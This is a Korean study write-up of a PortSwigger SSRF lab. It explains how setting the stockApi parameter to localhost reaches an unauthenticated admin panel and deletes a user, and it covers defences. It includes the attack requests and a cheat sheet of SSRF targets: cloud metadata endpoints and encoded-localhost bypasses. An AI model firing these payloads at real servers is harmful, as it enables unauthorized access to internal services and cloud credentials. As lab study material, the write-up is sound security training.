# Lab: Basic SSRF against the local server

## 개요

- **난이도**: Apprentice
- **주제**: SSRF — URL 파라미터 조작 / localhost 신뢰 / 내부 관리 기능 접근
- **링크**: https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost

## 목표

재고 확인 기능의 `stockApi` 파라미터에 URL 을 직접 지정한다. 서버가 이 URL 로 요청을 보내므로, `http://localhost/admin` 으로 변경해 내부 관리자 패널에 접근하고 사용자를 삭제한다.

## XXE-SSRF(002 랩) 와의 차이

```
[XXE 002 — XML 엔티티 경유 SSRF]
  XML 파서가 외부 엔티티 URI 를 fetch
  진입점: Content-Type: application/xml
  페이로드: <!ENTITY xxe SYSTEM "http://169.254.169.254/...">

[SSRF 001 (이번) — URL 파라미터 직접 조작]
  서버가 파라미터의 URL 을 직접 fetch
  진입점: Content-Type: x-www-form-urlencoded
  페이로드: stockApi=http://localhost/admin
  구조가 단순 → 가장 기본적인 SSRF 형태
```

## 취약점 구조

### 정상 요청

```http
POST /product/stock HTTP/1.1
Content-Type: application/x-www-form-urlencoded

stockApi=http://stock.weliketoshop.net:8080/product/stock/check
         ?productId=1&storeId=1
```

```
서버 내부 동작:
  stockApi 파라미터의 URL 을 그대로 fetch
  → 재고 데이터 반환
```

### localhost 가 신뢰되는 이유

```
서버가 localhost 를 신뢰하는 논리:

[가정 1 — 네트워크 위치 신뢰]
  localhost = 서버 자신
  → "자기 자신에서 온 요청은 내부 요청"
  → 외부 사용자가 접근 불가하다고 가정
  → 인증 없이 허용

[가정 2 — 관리 기능 설계]
  /admin 은 외부에서 접근 불가 (방화벽, 라우팅)
  → localhost 에서만 접근 허용
  → 별도 인증 생략

취약점:
  SSRF 로 서버가 자기 자신에게 요청을 보내면
  → 서버 입장에서 localhost 발신 = 내부 신뢰 요청
  → 인증 우회 + 관리 기능 접근
```

## 공격 방법

### 1단계: 관리자 패널 확인

```http
POST /product/stock HTTP/1.1
Content-Type: application/x-www-form-urlencoded

stockApi=http://localhost/admin
```

```
서버:
  http://localhost/admin 으로 요청 발생
  → localhost 신뢰 → 인증 없이 admin 패널 반환
  → 응답 본문에 admin 패널 HTML 포함

응답에서 확인:
  사용자 목록, 삭제 URL 등
  예: /admin/delete?username=carlos
```

### 2단계: 사용자 삭제

```http
POST /product/stock HTTP/1.1
Content-Type: application/x-www-form-urlencoded

stockApi=http://localhost/admin/delete?username=carlos
```

```
서버:
  http://localhost/admin/delete?username=carlos 요청
  → localhost 신뢰 → 관리자 권한으로 carlos 삭제
  → 랩 완료
```

### 실행 흐름

```
공격자 브라우저
  ↓ POST /product/stock (stockApi=http://localhost/admin)
취약한 서버 (WAS)
  ↓ GET http://localhost/admin  ← 서버 자신에게 요청
localhost 관리 서비스
  ↓ 인증 없이 응답 (localhost 신뢰)
취약한 서버 (WAS)
  ↓ 관리 패널 HTML 을 공격자에게 반환
공격자: 삭제 URL 확인 → 2단계 요청 전송
```

## localhost 신뢰 패턴의 위험성

```
신뢰 원인 유형:

[1. IP 기반 신뢰]
  if (request.remoteAddr == '127.0.0.1') → 관리자 허용
  → SSRF 로 서버가 자신에게 요청 → remoteAddr = 127.0.0.1

[2. 방화벽 기반 신뢰]
  /admin 경로를 외부 방화벽이 차단
  → 내부(localhost)에서는 허용
  → SSRF 로 내부 요청 발생 → 방화벽 우회

[3. 별도 포트 내부 서비스]
  외부: 443 포트만 노출
  내부: 8080, 8443 등 관리 포트 localhost 만 허용
  → SSRF: stockApi=http://localhost:8080/admin
```

## 방어

```
[1. URL 파라미터 화이트리스트]
  허용된 도메인/IP 만 접근:
    stock.weliketoshop.net 만 허용
    localhost, 127.0.0.1, 내부 IP 차단

[2. DNS 리바인딩 대비 재검증]
  URL 파싱 후 DNS 조회
  → 실제 IP 가 내부 대역인지 확인
  → 허용된 IP 에만 요청

[3. 내부 서비스 자체 인증]
  localhost 에서 온 요청이어도 인증 토큰 요구
  → SSRF 로 도달해도 권한 없음
  → "네트워크 위치 신뢰" 설계 지양

[4. 아웃바운드 HTTP 방화벽]
  WAS 프로세스의 아웃바운드 HTTP 를 허용 목록으로 제한
  → 허용 외 URL 로의 요청 차단
```

## 핵심 정리

- `stockApi` 같은 URL 파라미터를 서버가 그대로 fetch 하면 SSRF 가 발생한다.
- 서버가 localhost 를 신뢰해 인증 없이 관리 기능을 허용할 때, SSRF 로 우회가 가능하다.
- 사용자 언급대로 **"localhost = 안전하다"는 가정 자체가 취약점**이다 — 네트워크 위치가 아닌 요청 자체에 인증이 있어야 한다.
- 방어 핵심: URL 파라미터 화이트리스트 + 내부 서비스 자체 인증.

## 배운 점 및 추가 학습

### 1. SSRF 취약 URL 파라미터 패턴

```
흔히 발견되는 SSRF 진입점:

파라미터명 힌트:
  url=, stockApi=, imageUrl=, webhookUrl=
  fetch=, load=, redirect=, next=
  dest=, target=, proxy=, callback=

기능 힌트:
  이미지/파일 원격 로드
  웹훅 연동
  외부 API 프록시
  URL 미리보기
  PDF/스크린샷 생성 서비스
```

### 2. SSRF 타겟 정리

```
localhost / 127.0.0.1:
  http://localhost/admin
  http://127.0.0.1/admin
  http://0.0.0.0/admin        ← 일부 OS 에서 localhost 동작
  http://[::1]/admin          ← IPv6 localhost

내부 네트워크:
  http://192.168.0.1/         ← 내부 라우터
  http://10.0.0.1/            ← 내부 서버

클라우드 메타데이터 (XXE 002 랩 학습):
  http://169.254.169.254/     ← AWS IMDS
  http://metadata.google.internal/

localhost 우회 표현:
  http://127.1/               ← 단축 표기
  http://2130706433/          ← 10진수 IP (127.0.0.1)
  http://0x7f000001/          ← 16진수 IP
  http://localhost.attacker.com/ ← DNS 로 127.0.0.1 반환
```

### 3. XXE SSRF vs 직접 SSRF 비교

| 항목 | XXE SSRF (007-002) | 직접 SSRF (이번) |
|------|-------------------|----------------|
| 진입점 | XML 외부 엔티티 | URL 파라미터 |
| Content-Type | application/xml | form-urlencoded 등 |
| 응답 반영 | 엔티티로 치환 | 서버가 직접 반환 |
| 헤더 추가 | 불가 | 가능 (일부 구현) |
| 난이도 | 복잡 | 단순 |
